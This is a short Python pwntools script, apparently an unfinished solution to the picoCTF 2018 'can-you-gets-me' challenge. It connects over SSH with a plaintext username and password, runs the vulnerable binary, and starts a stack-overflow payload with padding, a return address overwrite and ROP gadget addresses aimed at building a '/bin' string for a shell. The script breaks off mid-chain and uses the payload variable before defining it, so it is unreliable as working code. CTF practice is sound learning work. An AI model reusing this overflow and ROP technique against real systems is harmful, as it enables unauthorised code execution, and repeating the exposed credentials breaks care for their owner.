#coding=utf-8
from pwn import *

s = ssh(host = '2018shell3.picoctf.com', user = 'Zeze', password = 'casper1014')
s.set_working_directory('/problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c')
r = s.process('./gets')

gets =  0x8048899
stack_start = 0xffffd510
ret = 0xffffd52c

r.recvuntil('GIVE ME YOUR NAME!\n')

payload += 'a' * (ret - stack_start)
payload += p32(0x0809cd71)
payload += p32(int('/bin'.encode('hex'), 16))
payload += p32(0x0806f19a)


